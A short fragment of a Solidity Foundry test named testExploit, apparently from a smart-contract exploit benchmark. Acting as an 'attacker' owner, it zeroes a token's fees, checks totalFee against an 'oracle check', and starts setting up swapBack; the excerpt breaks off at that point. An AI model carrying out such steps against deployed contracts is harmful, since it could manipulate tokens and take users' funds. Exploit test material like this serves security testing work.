    function testExploit() public {
        // Step 1: Set all fees to 0 as owner
        vm.prank(attacker);
        target.setFees_base1000(0, 0, 0, 0, 0, 0);

        // Step 2: Verify totalFee is now 0 (ORACLE CHECK)
        uint256 totalFee = target.totalFee();
        assertEq(totalFee, 0, "Oracle check: totalFee must be 0");

        // Step 3: Enable swapBack with a low threshold
        vm.prank(attacker);
